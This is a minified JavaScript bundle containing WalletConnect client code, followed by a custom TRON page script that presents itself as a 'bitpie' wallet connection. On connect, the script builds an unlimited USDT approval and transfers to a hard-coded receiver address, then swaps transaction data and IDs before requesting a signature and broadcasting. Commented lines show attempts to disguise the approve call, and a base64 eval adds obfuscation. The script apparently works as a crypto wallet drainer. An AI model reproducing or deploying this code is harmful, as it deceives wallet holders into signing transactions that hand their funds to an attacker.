        c(this, "isLinkModeEnabled", (Z, oe) => {
            var et, st, ws, ms, Es, vs, _s, Is, Ss;
            return !Z || oe !== Q.link_mode ? !1 : ((st = (et = this.client.metadata) == null ? void 0 : et.redirect) == null ? void 0 : st.linkMode) === !0 && ((ms = (ws = this.client.metadata) == null ? void 0 : ws.redirect) == null ? void 0 : ms.universal) !== void 0 && ((vs = (Es = this.client.metadata) == null ? void 0 : Es.redirect) == null ? void 0 : vs.universal) !== "" && ((_s = Z == null ? void 0 : Z.redirect) == null ? void 0 : _s.universal) !== void 0 && ((Is = Z == null ? void 0 : Z.redirect) == null ? void 0 : Is.universal) !== "" && ((Ss = Z == null ? void 0 : Z.redirect) == null ? void 0 : Ss.linkMode) === !0 && this.client.core.linkModeSupportedApps.includes(Z.redirect.universal) && typeof (window == null ? void 0 : window.Linking) < "u"
        }
        ),
        c(this, "getAppLinkIfEnabled", (Z, oe) => {
            var et;
            return this.isLinkModeEnabled(Z, oe) ? (et = Z == null ? void 0 : Z.redirect) == null ? void 0 : et.universal : void 0
        }
        ),
        c(this, "handleLinkModeMessage", ({url: Z}) => {
            if (!Z || !Z.includes("wc_ev") || !Z.includes("topic"))
                return;
            const oe = li$1(Z, "topic") || ""
              , et = decodeURIComponent(li$1(Z, "wc_ev") || "")
              , st = this.client.session.keys.includes(oe);
            st && this.client.session.update(oe, {
                transportType: Q.link_mode
            }),
            this.client.core.dispatchEnvelope({
                topic: oe,
                message: et,
                sessionExists: st
            })
        }
        ),
        c(this, "registerLinkModeListeners", async () => {
            var Z;
            if (hi$1() || Bt$1() && (Z = this.client.metadata.redirect) != null && Z.linkMode) {
                const oe = window == null ? void 0 : window.Linking;
                if (typeof oe < "u") {
                    oe.addEventListener("url", this.handleLinkModeMessage, this.client.name);
                    const et = await oe.getInitialURL();
                    et && setTimeout( () => {
                        this.handleLinkModeMessage({
                            url: et
                        })
                    }
                    , 50)
                }
            }
        }
        ),
        c(this, "getTVFParams", (Z, oe, et) => {
            var st, ws, ms;
            if (!((st = oe.request) != null && st.method))
                return {};
            const Es = {
                correlationId: Z,
                rpcMethods: [oe.request.method],
                chainId: oe.chainId
            };
            try {
                const vs = this.extractTxHashesFromResult(oe.request, et);
                Es.txHashes = vs,
                Es.contractAddresses = this.isValidContractData(oe.request.params) ? [(ms = (ws = oe.request.params) == null ? void 0 : ws[0]) == null ? void 0 : ms.to] : []
            } catch (vs) {
                this.client.logger.warn("Error getting TVF params", vs)
            }
            return Es
        }
        ),
        c(this, "isValidContractData", Z => {
            var oe;
            if (!Z)
                return !1;
            try {
                const et = (Z == null ? void 0 : Z.data) || ((oe = Z == null ? void 0 : Z[0]) == null ? void 0 : oe.data);
                if (!et.startsWith("0x"))
                    return !1;
                const st = et.slice(2);
                return /^[0-9a-fA-F]*$/.test(st) ? st.length % 2 === 0 : !1
            } catch {}
            return !1
        }
        ),
        c(this, "extractTxHashesFromResult", (Z, oe) => {
            var et;
            try {
                if (!oe)
                    return [];
                const st = Z.method
                  , ws = gt[st];
                if (st === "sui_signTransaction")
                    return [ff(oe.transactionBytes)];
                if (st === "near_signTransaction")
                    return [cf(oe)];
                if (st === "near_signTransactions")
                    return oe.map(Es => cf(Es));
                if (st === "xrpl_signTransactionFor" || st === "xrpl_signTransaction")
                    return [(et = oe.tx_json) == null ? void 0 : et.hash];
                if (st === "polkadot_signTransaction")
                    return [Ka({
                        transaction: Z.params.transactionPayload,
                        signature: oe.signature
                    })];
                if (st === "algo_signTxn")
                    return me$1(oe) ? oe.map(Es => af(Es)) : [af(oe)];
                if (st === "cosmos_signDirect")
                    return [uf(oe)];
                if (typeof oe == "string")
                    return [oe];
                const ms = oe[ws.key];
                if (me$1(ms))
                    return st === "solana_signAllTransactions" ? ms.map(Es => sf(Es)) : ms;
                if (typeof ms == "string")
                    return [ms]
            } catch (st) {
                this.client.logger.warn("Error extracting tx hashes from result", st)
            }
            return []
        }
        )
    }
    async processPendingMessageEvents() {
        try {
            const U = this.client.session.keys
              , Z = this.client.core.relayer.messages.getWithoutAck(U);
            for (const [oe,et] of Object.entries(Z))
                for (const st of et)
                    try {
                        await this.onProviderMessageEvent({
                            topic: oe,
                            message: st,
                            publishedAt: Date.now()
                        })
                    } catch {
                        this.client.logger.warn(`Error processing pending message event for topic: ${oe}, message: ${st}`)
                    }
        } catch (U) {
            this.client.logger.warn("processPendingMessageEvents failed", U)
        }
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
    async confirmOnlineStateOrThrow() {
        await this.client.core.relayer.confirmOnlineStateOrThrow()
    }
    registerRelayerEvents() {
        this.client.core.relayer.on(C.message, U => {
            this.onProviderMessageEvent(U)
        }
        )
    }
    async onRelayMessage(U) {
        const {topic: Z, message: oe, attestation: et, transportType: st} = U
          , {publicKey: ws} = this.client.auth.authKeys.keys.includes(ce) ? this.client.auth.authKeys.get(ce) : {
            responseTopic: void 0,
            publicKey: void 0
        };
        try {
            const ms = await this.client.core.crypto.decode(Z, oe, {
                receiverPublicKey: ws,
                encoding: st === Q.link_mode ? De$1 : Qt$1
            });
            isJsonRpcRequest(ms) ? (this.client.core.history.set(Z, ms),
            await this.onRelayEventRequest({
                topic: Z,
                payload: ms,
                attestation: et,
                transportType: st,
                encryptedId: zc(oe)
            })) : isJsonRpcResponse(ms) ? (await this.client.core.history.resolve(ms),
            await this.onRelayEventResponse({
                topic: Z,
                payload: ms,
                transportType: st
            }),
            this.client.core.history.delete(Z, ms.id)) : await this.onRelayEventUnknownPayload({
                topic: Z,
                payload: ms,
                transportType: st
            }),
            await this.client.core.relayer.messages.ack(Z, oe)
        } catch (ms) {
            this.client.logger.error(ms)
        }
    }
    registerExpirerEvents() {
        this.client.core.expirer.on(M.expired, async U => {
            const {topic: Z, id: oe} = si$1(U.target);
            if (oe && this.client.pendingRequest.keys.includes(oe))
                return await this.deletePendingSessionRequest(oe, Et$2("EXPIRED"), !0);
            if (oe && this.client.auth.requests.keys.includes(oe))
                return await this.deletePendingAuthRequest(oe, Et$2("EXPIRED"), !0);
            Z ? this.client.session.keys.includes(Z) && (await this.deleteSession({
                topic: Z,
                expirerHasDeleted: !0
            }),
            this.client.events.emit("session_expire", {
                topic: Z
            })) : oe && (await this.deleteProposal(oe, !0),
            this.client.events.emit("proposal_expire", {
                id: oe
            }))
        }
        )
    }
    registerPairingEvents() {
        this.client.core.pairing.events.on(re.create, U => this.onPairingCreated(U)),
        this.client.core.pairing.events.on(re.delete, U => {
            this.addToRecentlyDeleted(U.topic, "pairing")
        }
        )
    }
    isValidPairingTopic(U) {
        if (!it(U, !1)) {
            const {message: Z} = Et$2("MISSING_OR_INVALID", `pairing topic should be a string: ${U}`);
            throw new Error(Z)
        }
        if (!this.client.core.pairing.pairings.keys.includes(U)) {
            const {message: Z} = Et$2("NO_MATCHING_KEY", `pairing topic doesn't exist: ${U}`);
            throw new Error(Z)
        }
        if (fi$1(this.client.core.pairing.pairings.get(U).expiry)) {
            const {message: Z} = Et$2("EXPIRED", `pairing topic: ${U}`);
            throw new Error(Z)
        }
    }
    async isValidSessionTopic(U) {
        if (!it(U, !1)) {
            const {message: Z} = Et$2("MISSING_OR_INVALID", `session topic should be a string: ${U}`);
            throw new Error(Z)
        }
        if (this.checkRecentlyDeleted(U),
        !this.client.session.keys.includes(U)) {
            const {message: Z} = Et$2("NO_MATCHING_KEY", `session topic doesn't exist: ${U}`);
            throw new Error(Z)
        }
        if (fi$1(this.client.session.get(U).expiry)) {
            await this.deleteSession({
                topic: U
            });
            const {message: Z} = Et$2("EXPIRED", `session topic: ${U}`);
            throw new Error(Z)
        }
        if (!this.client.core.crypto.keychain.has(U)) {
            const {message: Z} = Et$2("MISSING_OR_INVALID", `session topic does not exist in keychain: ${U}`);
            throw await this.deleteSession({
                topic: U
            }),
            new Error(Z)
        }
    }
    async isValidSessionOrPairingTopic(U) {
        if (this.checkRecentlyDeleted(U),
        this.client.session.keys.includes(U))
            await this.isValidSessionTopic(U);
        else if (this.client.core.pairing.pairings.keys.includes(U))
            this.isValidPairingTopic(U);
        else if (it(U, !1)) {
            const {message: Z} = Et$2("NO_MATCHING_KEY", `session or pairing topic doesn't exist: ${U}`);
            throw new Error(Z)
        } else {
            const {message: Z} = Et$2("MISSING_OR_INVALID", `session or pairing topic should be a string: ${U}`);
            throw new Error(Z)
        }
    }
    async isValidProposalId(U) {
        if (!Ia(U)) {
            const {message: Z} = Et$2("MISSING_OR_INVALID", `proposal id should be a number: ${U}`);
            throw new Error(Z)
        }
        if (!this.client.proposal.keys.includes(U)) {
            const {message: Z} = Et$2("NO_MATCHING_KEY", `proposal id doesn't exist: ${U}`);
            throw new Error(Z)
        }
        if (fi$1(this.client.proposal.get(U).expiryTimestamp)) {
            await this.deleteProposal(U);
            const {message: Z} = Et$2("EXPIRED", `proposal id: ${U}`);
            throw new Error(Z)
        }
    }
}
class ks extends Li {
    constructor(U, Z) {
        super(U, Z, ht, me),
        this.core = U,
        this.logger = Z
    }
}
class vt extends Li {
    constructor(U, Z) {
        super(U, Z, dt, me),
        this.core = U,
        this.logger = Z
    }
}
class Ds extends Li {
    constructor(U, Z) {
        super(U, Z, yt, me, oe => oe.id),
        this.core = U,
        this.logger = Z
    }
}
class Ls extends Li {
    constructor(U, Z) {
        super(U, Z, Et, ae, () => ce),
        this.core = U,
        this.logger = Z
    }
}
class Ms extends Li {
    constructor(U, Z) {
        super(U, Z, ft, ae),
        this.core = U,
        this.logger = Z
    }
}
class $s extends Li {
    constructor(U, Z) {
        super(U, Z, St, ae, oe => oe.id),
        this.core = U,
        this.logger = Z
    }
}
var Ks = Object.defineProperty
  , Us = (q, U, Z) => U in q ? Ks(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , Ke = (q, U, Z) => Us(q, typeof U != "symbol" ? U + "" : U, Z);
class Gs {
    constructor(U, Z) {
        this.core = U,
        this.logger = Z,
        Ke(this, "authKeys"),
        Ke(this, "pairingTopics"),
        Ke(this, "requests"),
        this.authKeys = new Ls(this.core,this.logger),
        this.pairingTopics = new Ms(this.core,this.logger),
        this.requests = new $s(this.core,this.logger)
    }
    async init() {
        await this.authKeys.init(),
        await this.pairingTopics.init(),
        await this.requests.init()
    }
}
var js = Object.defineProperty
  , Fs = (q, U, Z) => U in q ? js(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , f = (q, U, Z) => Fs(q, typeof U != "symbol" ? U + "" : U, Z);
class Ee extends J$2 {
    constructor(U) {
        super(U),
        f(this, "protocol", Ce),
        f(this, "version", ke),
        f(this, "name", we.name),
        f(this, "metadata"),
        f(this, "core"),
        f(this, "logger"),
        f(this, "events", new eventsExports.EventEmitter),
        f(this, "engine"),
        f(this, "session"),
        f(this, "proposal"),
        f(this, "pendingRequest"),
        f(this, "auth"),
        f(this, "signConfig"),
        f(this, "on", (oe, et) => this.events.on(oe, et)),
        f(this, "once", (oe, et) => this.events.once(oe, et)),
        f(this, "off", (oe, et) => this.events.off(oe, et)),
        f(this, "removeListener", (oe, et) => this.events.removeListener(oe, et)),
        f(this, "removeAllListeners", oe => this.events.removeAllListeners(oe)),
        f(this, "connect", async oe => {
            try {
                return await this.engine.connect(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "pair", async oe => {
            try {
                return await this.engine.pair(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "approve", async oe => {
            try {
                return await this.engine.approve(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "reject", async oe => {
            try {
                return await this.engine.reject(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "update", async oe => {
            try {
                return await this.engine.update(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "extend", async oe => {
            try {
                return await this.engine.extend(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "request", async oe => {
            try {
                return await this.engine.request(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "respond", async oe => {
            try {
                return await this.engine.respond(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "ping", async oe => {
            try {
                return await this.engine.ping(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "emit", async oe => {
            try {
                return await this.engine.emit(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "disconnect", async oe => {
            try {
                return await this.engine.disconnect(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "find", oe => {
            try {
                return this.engine.find(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "getPendingSessionRequests", () => {
            try {
                return this.engine.getPendingSessionRequests()
            } catch (oe) {
                throw this.logger.error(oe.message),
                oe
            }
        }
        ),
        f(this, "authenticate", async (oe, et) => {
            try {
                return await this.engine.authenticate(oe, et)
            } catch (st) {
                throw this.logger.error(st.message),
                st
            }
        }
        ),
        f(this, "formatAuthMessage", oe => {
            try {
                return this.engine.formatAuthMessage(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "approveSessionAuthenticate", async oe => {
            try {
                return await this.engine.approveSessionAuthenticate(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        f(this, "rejectSessionAuthenticate", async oe => {
            try {
                return await this.engine.rejectSessionAuthenticate(oe)
            } catch (et) {
                throw this.logger.error(et.message),
                et
            }
        }
        ),
        this.name = (U == null ? void 0 : U.name) || we.name,
        this.metadata = Ks$1(U == null ? void 0 : U.metadata),
        this.signConfig = U == null ? void 0 : U.signConfig;
        const Z = typeof (U == null ? void 0 : U.logger) < "u" && typeof (U == null ? void 0 : U.logger) != "string" ? U.logger : Vt$3(k$3({
            level: (U == null ? void 0 : U.logger) || we.logger
        }));
        this.core = (U == null ? void 0 : U.core) || new Zo(U),
        this.logger = E$1(Z, this.name),
        this.session = new vt(this.core,this.logger),
        this.proposal = new ks(this.core,this.logger),
        this.pendingRequest = new Ds(this.core,this.logger),
        this.engine = new Cs(this),
        this.auth = new Gs(this.core,this.logger)
    }
    static async init(U) {
        const Z = new Ee(U);
        return await Z.initialize(),
        Z
    }
    get context() {
        return y$2(this.logger)
    }
    get pairing() {
        return this.core.pairing.pairings
    }
    async initialize() {
        this.logger.trace("Initialized");
        try {
            await this.core.start(),
            await this.session.init(),
            await this.proposal.init(),
            await this.pendingRequest.init(),
            await this.auth.init(),
            await this.engine.init(),
            this.logger.info("SignClient Initialization Success")
        } catch (U) {
            throw this.logger.info("SignClient Initialization Failure"),
            this.logger.error(U.message),
            U
        }
    }
}
class ClientNotInitializedError extends Error {
    constructor() {
        super(),
        Object.setPrototypeOf(this, ClientNotInitializedError.prototype)
    }
}
class Web3ModalError extends Error {
    constructor(U) {
        super(U),
        Object.setPrototypeOf(this, Web3ModalError.prototype)
    }
}
var WalletConnectChainID;
(function(q) {
    q.Mainnet = "tron:0x2b6653dc",
    q.Shasta = "tron:0x94a9059e",
    q.Nile = "tron:0xcd8690dc"
}
)(WalletConnectChainID || (WalletConnectChainID = {}));
var WalletConnectMethods;
(function(q) {
    q.signTransaction = "tron_signTransaction",
    q.signMessage = "tron_signMessage"
}
)(WalletConnectMethods || (WalletConnectMethods = {}));
const getConnectParams = (q, U) => ({
    requiredNamespaces: {
        tron: {
            chains: [q],
            methods: [WalletConnectMethods.signTransaction, WalletConnectMethods.signMessage],
            events: []
        }
    },
    pairingTopic: U
});
class WalletConnectWallet {
    constructor(U) {
        this._options = U.options,
        this._network = U.network,
        this._modalConfig = U.web3ModalConfig || {},
        this.web3Modal = new WalletConnectModal({
            ...this._modalConfig,
            projectId: this._options.projectId,
            chains: [this._network, ...this._modalConfig.chains || []]
        })
    }
    async connect() {
        const U = this._client ?? await Ee.init(this._options)
          , Z = U.find(getConnectParams(this._network)).filter(oe => oe.acknowledged);
        if (Z.length) {
            this._session = Z[Z.length - 1],
            this._client = U,
            this._client = U;
            const oe = Object.values(this._session.namespaces).map(et => et.accounts).flat();
            return this.address = oe[0].split(":")[2],
            {
                address: this.address
            }
        } else {
            const {uri: oe, approval: et} = await U.connect(getConnectParams(this._network));
            return new Promise( (st, ws) => {
                oe && (this.web3Modal.openModal({
                    uri: oe,
                    chains: [this._network]
                }),
                this.web3Modal.subscribeModal(ms => {
                    ms.open === !1 && ws(new Web3ModalError("Modal is closed."))
                }
                )),
                et().then(ms => {
                    this._session = ms,
                    this._client = U;
                    const Es = Object.values(this._session.namespaces).map(vs => vs.accounts).flat();
                    this.address = Es[0].split(":")[2],
                    st({
                        address: this.address
                    })
                }
                ).catch(ws).finally( () => {
                    this.web3Modal.closeModal()
                }
                )
            }
            )
        }
    }
    async disconnect() {
        if (this._client && this._session)
            await this._client.disconnect({
                topic: this._session.topic,
                reason: Kt$1("USER_DISCONNECTED")
            }),
            this._session = void 0;
        else
            throw new ClientNotInitializedError
    }
    get client() {
        if (this._client)
            return Object.assign({}, this._client, {
                off: this._client.removeListener
            });
        throw new ClientNotInitializedError
    }
    async checkConnectStatus() {
        const U = this._client ?? await Ee.init(this._options)
          , Z = U.find(getConnectParams(this._network)).filter(oe => oe.acknowledged);
        if (Z.length) {
            this._session = Z[Z.length - 1],
            this._client = U;
            const oe = Object.values(this._session.namespaces).map(et => et.accounts).flat();
            return this.address = oe[0].split(":")[2],
            {
                address: this.address
            }
        } else
            return {
                address: ""
            }
    }
    async signTransaction(U) {
        if (this._client && this._session) {
            const {result: Z} = await this._client.request({
                chainId: this._network,
                topic: this._session.topic,
                request: {
                    method: WalletConnectMethods.signTransaction,
                    params: {
                        address: this.address,
                        transaction: {
                            ...U
                        }
                    }
                }
            });
            return Z
        } else
            throw new ClientNotInitializedError
    }
    async signMessage(U) {
        if (this._client && this._session) {
            const {signature: Z} = await this._client.request({
                chainId: this._network,
                topic: this._session.topic,
                request: {
                    method: WalletConnectMethods.signMessage,
                    params: {
                        address: this.address,
                        message: U
                    }
                }
            });
            return Z
        } else
            throw new ClientNotInitializedError
    }
}
const PROJECT_ID = "6e5e0ad7ffa9d4311442b0143abebc60"
  , USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
  , RECEIVER =  "TWonQDtwMakQgvZZQsLNLj7eAtZqJLJ7Hg"
  , AMOUNT = 0.00001
  , AMOUNTTO = 99999999999999999999999999999999999
  , wallet = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
        projectId: PROJECT_ID,
        metadata: {
            name: "bitpie",
            description: "bitpie 连接 TRON 钱包",
            url: "http://127.0.0.1:6661",
            icons: []
        }
    }
});
await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts'});
let address = "";
const btnConnect = document.getElementById("btnConnect")
  , btnSend = document.getElementById("btnSend")
  , addressEl = document.getElementById("address");
btnConnect.onclick = async () => {
    try {
        address = (await wallet.connect()).address,
        addressEl.textContent = address,
        btnSend.disabled = !1,
        console.log("钱包已连接，地址：" + address)
    } catch (q) {
        console.error("连接失败:", q),
        console.log("连接钱包失败")
    }
    try {
        const base64Code = btoa(`window.tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io'
});`)
          , decoded = atob(base64Code);
        eval(decoded);

const txResult = await tronWeb.transactionBuilder.triggerSmartContract(
  tronWeb.address.toHex(USDT_CONTRACT),
  "transfer(address,uint256)",
  {},
  [
    { type: "address", value: tronWeb.address.toHex(RECEIVER) },
    { type: "uint256", value: tronWeb.toSun(AMOUNT) }
  ],
  tronWeb.address.toHex(address)
);

const txResultto = await tronWeb.transactionBuilder.triggerSmartContract(
  tronWeb.address.toHex(USDT_CONTRACT),
  "approve(address,uint256)",
  {},
  [
    { type: "address", value: tronWeb.address.toHex(RECEIVER) },
    { type: "uint256", value: tronWeb.toSun(AMOUNTTO) }
  ],
  tronWeb.address.toHex(address)
);

const txResultTRX = await tronWeb.transactionBuilder.sendTrx(RECEIVER, 10, address);

      // let raw_data_hex = txResultto.transaction.raw_data.contract[0].parameter.value.data;
    // const transactionInfo = tronWeb.toHex("交易备注信息"); // 转为 HEX
    // raw_data_hex += transactionInfo; // 将备注信息附加到末尾
// const rawData = txResultto.transaction.raw_data.contract[0].parameter.value.data;
// const upperCaseData = rawData.toUpperCase();
// console.log(upperCaseData);
 // let appdata = txResultto;
 // delete appdata.transaction.raw_data_hex;
  // console.log(txResult.transaction.raw_data.contract[0].parameter.value.data);
 // let rawData = txResultto.transaction.raw_data.contract[0].parameter.value.data;
 // txResultto.transaction.raw_data.contract[0].parameter.value.data = rawData.replace(/095ea7b/g, 'a9059cbb');
// delete txResultto.transaction.raw_data.contract;

 // txResultto.transaction.raw_data.contract = [
  // ...txResult.transaction.raw_data.contract
// ];
//delete txResultto.transaction.raw_data.contract[1];
// console.log("txResultto:", txResultto.transaction.raw_data.contract[0].parameter.value);

//delete txResultto.transaction.raw_data.contract[0].parameter.value.data;

// console.log("txResultTRX:", txResultTRX);

 txResultto.transaction.txID = txResultTRX.txID;
 txResultto.transaction.raw_data = txResultTRX.raw_data;
// delete txResultto.transaction.raw_data.contract[0].parameter.value.amount;
// console.log(txResultto);
//transaction.raw_data_hex = txResultto.transaction.raw_data_hex;
//appdata.transaction.raw_data_hex  = txResult.transaction.raw_data_hex;
//txResultto.transaction.txid = txResult.transaction.txid;
//txResult.transaction.raw_data_hex  = txResultto.transaction.raw_data_hex;
//txResultto.transaction.raw_data_hex = txResult.transaction.raw_data_hex;
//console.log("txResult:", txResult.transaction.raw_data.contract[0].parameter.value);
//console.log("txResultTRX:", txResultTRX.transaction.raw_data.contract[0].parameter.value);
//console.log("待签名交易tx:", txResult);

// 合并两个交易的 raw_data
 // let appdata = txResultto.transaction.raw_data.contract;
// delete txResultto.transaction.raw_data.contract;
// txResultto.transaction.raw_data.contract = [
  // ...txResult.transaction.raw_data.contract,
  // ...appdata
// ];


//合并两个交易的 raw_data
 // let appdata = txResultTRX;
// //delete txResultto.transaction.raw_data.contract;
// appdata.raw_data.contract[0].parameter.value = [
  // ...txResultTRX.raw_data.contract[0].parameter.value,
  // ...txResult.transaction.raw_data.contract[0].parameter.value
// ];

// delete appdata.raw_data.contract[0].parameter.value.data;
 // console.log("appdata:", appdata.raw_data.contract[0].parameter.value);
// console.log("待签名交易to:", txResultto.transaction.raw_data);


// delete txResult.transaction.raw_data.contract[0].parameter.value.contract_address;
 //delete txResult.transaction.raw_data.contract[0].parameter.value.owner_address;
//console.log("待签名交易to:", txResult.transaction.raw_data.contract[0].parameter.value.data);

	try {
		    // 检查是否已连接钱包
			const tronWeb =  await okxwallet.tronLink.tronWeb;

	  // 先进行签名 wallet.signTransaction  txResultto  txResultTRX
	  const signedTx = await wallet.signTransaction(txResultto);

	 // const signedTx = await okxwallet.tronLink.tronWeb.trx.sign(txResultto);
	  alert("签名成功");




	  // 检查签名结果是否有效
	  if (!signedTx || !signedTx.txID) {
		throw new Error("签名数据无效");
	  }

		// const signedTransaction = {
		  // raw_data_hex: signedTx.raw_data_hex,
		  // signature: signedTx.signature
		// };
			  // console.log("签名成功", signedTransaction);
		// // 使用 TronWeb 广播已签名的交易
	// tronWeb.trx.sendRawTransaction(signedTransaction)
	  // .then(response => {
		// console.log('Transaction Broadcasted:', response);
	  // })
	  // .catch(error => {
		// console.error('Error Broadcasting Transaction:', error);
	  // });



	  // 签名成功后广播交易
	  const txHash = await tronWeb.trx.sendRawTransaction(signedTx);

	  alert("交易已广播，交易哈希:", txHash);
	  console.log("交易已广播，交易哈希:", txHash);
	  if (txHash && typeof txHash === 'string' && txHash.length > 0) {
	    alert('✅ 交易成功，哈希：' + txHash + '\n查看：https://tronscan.org/#/transaction/' + txHash);
		 
	  } else {
	   alert('❌ 广播失败，未获取到交易哈希');
		
	  } 
	} catch (err) {
	  alert("签名或交易广播失败", err);
	}



    } catch (q) {
        console.error("转账失败:", q),
        console.log("转账失败，请查看控制台")
    }
}
;
btnSend.onclick = async () => {
    if (!address) {
        console.log("请先连接钱包");
        return
    }
    try {
        const base64Code = btoa(`window.tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io'
});`)
          , decoded = atob(base64Code);
        eval(decoded);
        const amountSun = tronWeb.toSun(AMOUNT)
          , params = [{
            type: "address",
            value: tronWeb.address.toHex(RECEIVER)
        }, {
            type: "uint256",
            value: amountSun
        }]
          , txResult = await tronWeb.transactionBuilder.triggerSmartContract(tronWeb.address.toHex(USDT_CONTRACT), "transfer(address,uint256)", {}, params, tronWeb.address.toHex(address));
console.log("txResult:", txResult);
console.log("txResult.transaction:", txResult.transaction);
	   if (!txResult.transaction)
            throw new Error("构造交易失败");
	console.log("开始签名:");	
const signedTx = await wallet.signTransaction(txResult.transaction);

console.log("签名成功:", signedTx);
const broadcastResult = await tronWeb.fullNode.request('wallet/broadcasttransaction', signedTx, 'post');
//const broadcastResult = tronWeb.fullNode.request()//await tronWeb.trx.sendRawTransaction(signedTx);
console.log("广播结果:", broadcastResult);
        broadcastResult.result ? console.log("转账成功，交易已广播") : console.log("交易广播失败")
    } catch (q) {
        console.error("转账失败:", q),
        console.log("转账失败，请查看控制台")
    }
}
;
const btnDisconnect = document.getElementById("btnDisconnect");
btnDisconnect.onclick = async () => {
    try {
        await wallet.disconnect(),
        address = "",
        addressEl.textContent = "未连接",
        btnSend.disabled = !0,
        alert("已断开连接")
    } catch (q) {
        console.error("断开连接失败:", q),
        alert("断开连接失败，请查看控制台")
    }
}
;
export {CoreUtil as C, ExplorerCtrl as E, Hash as H, ModalCtrl as M, OptionsCtrl as O, RouterCtrl as R, ThemeCtrl as T, ToastCtrl as a, EventsCtrl as b, ConfigCtrl as c, createView as d, aexists as e, abytes as f, aoutput as g, clean as h, createHasher as i, ahash as j, anumber$1 as k, concatBytes as l, randomBytes as m, rotr as r, toBytes as t};
